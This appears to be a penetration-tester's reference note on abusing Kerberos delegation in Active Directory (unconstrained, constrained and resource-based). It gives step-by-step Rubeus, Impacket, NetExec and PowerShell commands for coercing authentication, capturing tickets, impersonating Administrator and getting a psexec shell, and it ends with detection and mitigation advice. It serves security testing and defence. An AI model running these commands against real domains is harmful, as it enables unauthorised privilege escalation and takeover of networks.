---
tags:
  - "#type/technique"
  - "#tactic/TA0008"
  - "#technique/T1558"
  - "#stage/lateral-movement"
  - "#stage/privilege-escalation"
  - "#os/windows"
  - "#protocol/kerberos"
  - "#tool/rubeus"
  - "#tool/impacket"
  - "#tool/netexec"
  - "#tool/delegations"
aliases:
  - Kerberos Delegation
  - Unconstrained Delegation
  - Constrained Delegation
  - Resource-Based Constrained Delegation
  - RBCD
  - S4U2Self
  - S4U2Proxy
---

## Technique
___

Kerberos Delegation is a feature in Active Directory that allows service accounts to impersonate users when accessing other services. While this feature is designed for legitimate scenarios where a service needs to access resources on behalf of a user, it can be abused by attackers for privilege escalation and lateral movement.

There are three main types of Kerberos delegation:

1. **Unconstrained Delegation**: Allows a service to impersonate a user to any service on any computer.
2. **Constrained Delegation**: Restricts impersonation to specific services on specific computers.
3. **Resource-Based Constrained Delegation (RBCD)**: Allows the resource (rather than the impersonating service) to define which services can impersonate users to it.

## Prerequisites
___

**Access Level:** Varies by attack type, but generally requires some level of authenticated access to the domain.

**System State:** The target environment must be using Kerberos authentication with delegation configured.

**Information:** Knowledge of delegation configurations in the domain.

## Unconstrained Delegation
___

### Identification

#### From Linux (Remote):
```bash
nxc ldap 192.168.0.104 -u username -p password --trusted-for-delegation
```

#### From Windows (Local):
```powershell
# Using ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# Using PowerShell
Get-ADComputer -Filter {TrustedForDelegation -eq $True} -Properties TrustedForDelegation,TrustedToAuthForDelegation,servicePrincipalName,Description
```

> **Note**: Domain Controllers are always configured for unconstrained delegation by default.


### Exploitation

The attack works by:
1. Monitoring for TGT tickets on a system with unconstrained delegation
2. Forcing a domain controller or privileged user to authenticate to that system
3. Stealing the forwarded TGT and using it to impersonate the user

#### Monitor for Tickets with Rubeus:
```powershell
Rubeus.exe monitor /interval:10 /nowrap
```

#### Force Authentication:
Use various authentication coercion techniques like:
- PrinterBug (MS-RPRN)
- PetitPotam (MS-EFSRPC)
- ShadowCoerce (MS-FSRVP)

Example using SharpSpoolTrigger:
```powershell
SharpSpoolTrigger.exe dc01.lab.local web.dev.lab.local
```
Where:
- DC01 is the "target" (domain controller we want to authenticate)
- WEB is the "listener" (our compromised server with unconstrained delegation)

Rubeus should capture the TGT of the authenticating computer account, which can then be used for impersonation.

## Constrained Delegation
___

Constrained delegation uses two extensions to the Kerberos protocol:
- S4U2Self (Service for User to Self)
- S4U2Proxy (Service for User to Proxy)

These allow a service to request tickets on behalf of a user, but only to specific service SPNs configured via the `msDS-AllowedToDelegateTo` attribute.

More details: [[service_for_user_to_self|S4U2Self]]

### Identification

```bash
# Using NetExec
nxc ldap 192.168.0.104 -u username -p password --trusted-for-delegation --delegate-from

# Using PowerShell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

### Exploitation

If you have credentials for an account configured with constrained delegation:

```powershell
# Using Rubeus
Rubeus.exe s4u /user:serviceaccount$ /rc4:serviceaccount_ntlm_hash /impersonateuser:Administrator /domain:domain.local /msdsspn:cifs/targetserver.domain.local /ptt

# Using Impacket
impacket-getST -spn cifs/targetserver.domain.local -impersonate Administrator -dc-ip 192.168.0.100 domain.local/serviceaccount:password
```

## Resource-Based Constrained Delegation (RBCD)
___

RBCD allows a resource to specify which accounts can delegate to it, using the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.

### Exploitation

#### Using NetExec:
```bash
# If msDS-AllowedToActOnBehalfOfOtherIdentity is already set
nxc smb 192.168.56.11 -u jon.snow -p iknownothing --delegate Administrator
```

#### Using Impacket:

1. Create a computer account we control:
```bash
impacket-addcomputer -computer-name 'rbcd-test$' -computer-pass 'Password123!' -dc-ip 192.168.0.100 domain.local/username:password
```

2. Configure delegation rights:
```bash
impacket-rbcd -delegate-to 'TargetServer$' -delegate-from 'rbcd-test$' -dc-ip 192.168.0.100 -action write domain.local/username:password
```

3. Request ticket for admin:
```bash
impacket-getST -spn cifs/targetserver.domain.local -impersonate Administrator -dc-ip 192.168.0.100 domain.local/rbcd-test$:Password123!
```

4. Use the ticket:
```bash
export KRB5CCNAME=Administrator@cifs_targetserver.domain.local@DOMAIN.LOCAL.ccache
impacket-psexec Administrator@targetserver.domain.local -k -no-pass -dc-ip 192.168.0.100
```

#### Using PowerShell/Rubeus:

1. Create a machine account:
```powershell
# Using PowerMad
New-MachineAccount -MachineAccount rbcd-comp -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
```

2. Configure delegation rights:
```powershell
# Using built-in AD module
Set-ADComputer targetserver -PrincipalsAllowedToDelegateToAccount rbcd-comp$
```

3. Get hash and request ticket:
```powershell
# Get hash
Rubeus.exe hash /password:Password123! /user:rbcd-comp$ /domain:domain.local

# S4U request
Rubeus.exe s4u /user:rbcd-comp$ /rc4:hash_from_above /domain:domain.local /msdsspn:cifs/targetserver /impersonateuser:administrator /ptt
```

## Using Delegations Tool
___

The Delegations tool is a specialized utility for working with all types of Kerberos delegations in Active Directory environments. It provides comprehensive capabilities for auditing, adding, finding, clearing, and removing delegation configurations.

### Installation

```bash
# Install using Go
go install github.com/TheManticoreProject/Delegations@latest
```

### Audit Mode

Identify all delegation configurations in the domain:

```bash
./Delegations audit --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'
```

### Find Mode

Identify specific delegation types:

```bash
# Find unconstrained delegations
./Delegations find unconstrained --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'

# Find constrained delegations
./Delegations find constrained --distinguished-name "CN=ServiceAccount,CN=Users,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'

# Find RBCD configurations
./Delegations find rbcd --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'
```

### Add Delegations

```bash
# Add constrained delegation
./Delegations add constrained --distinguished-name "CN=ServiceAccount,CN=Users,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!' \
    --allowed-to-delegate-to "CIFS/server.domain.local"

# Add constrained delegation with protocol transition
./Delegations add constrained --distinguished-name "CN=ServiceAccount,CN=Users,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!' \
    --allowed-to-delegate-to "CIFS/server.domain.local" --with-protocol-transition

# Add unconstrained delegation
./Delegations add unconstrained --distinguished-name "CN=ServerAccount,CN=Computers,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'

# Add RBCD
./Delegations add rbcd --distinguished-name "CN=TargetServer,CN=Computers,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!' \
    --allowed-to-act-on-behalf-of-another-identity "AttackerAccount$"
```

### Remove Delegations

```bash
# Remove specific constrained delegation
./Delegations remove constrained --distinguished-name "CN=ServiceAccount,CN=Users,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!' \
    --allowed-to-delegate-to "CIFS/server.domain.local"

# Remove unconstrained delegation
./Delegations remove unconstrained --distinguished-name "CN=ServerAccount,CN=Computers,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'

# Remove RBCD
./Delegations remove rbcd --distinguished-name "CN=TargetServer,CN=Computers,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!' \
    --allowed-to-act-on-behalf-of-another-identity "AttackerAccount$"
```

### Clear All Delegations

```bash
# Clear all constrained delegations
./Delegations clear constrained --distinguished-name "CN=ServiceAccount,CN=Users,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'

# Clear all constrained delegations with protocol transition
./Delegations clear constrained --distinguished-name "CN=ServiceAccount,CN=Users,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!' --with-protocol-transition

# Clear unconstrained delegation
./Delegations clear unconstrained --distinguished-name "CN=ServerAccount,CN=Computers,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'

# Clear all RBCD
./Delegations clear rbcd --distinguished-name "CN=TargetServer,CN=Computers,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'
```

### Protocol Transition Management

```bash
# Add protocol transition
./Delegations add protocoltransition --distinguished-name "CN=ServiceAccount,CN=Users,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'

# Remove protocol transition
./Delegations remove protocoltransition --distinguished-name "CN=ServiceAccount,CN=Users,DC=domain,DC=local" \
    --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'
```

### Monitor Mode

```bash
# Monitor for delegation changes in real-time
./Delegations monitor --dc-ip 192.168.1.10 -d domain.local -u Administrator -p 'Password123!'
```

## Detection & Mitigation
___

### Detection

- Monitor for modifications to delegation-related attributes:
  - `UserAccountControl` (Unconstrained Delegation)
  - `msDS-AllowedToDelegateTo` (Constrained Delegation)
  - `msDS-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
- Watch for S4U2Self and S4U2Proxy ticket requests
- Monitor for TGT ticket exports using tools like Rubeus
- Use the Delegations tool's monitor mode to detect real-time changes to delegation configurations

### Mitigation

- Limit the number of accounts configured for delegation
- Use constrained delegation instead of unconstrained when necessary
- Mark sensitive accounts as "sensitive and cannot be delegated"
- Add privileged accounts to the Protected Users group
- Monitor and restrict the ability to create computer accounts
- Implement tiered administration model
- Regularly audit delegation configurations using tools like Delegations
- Remove unnecessary delegation privileges
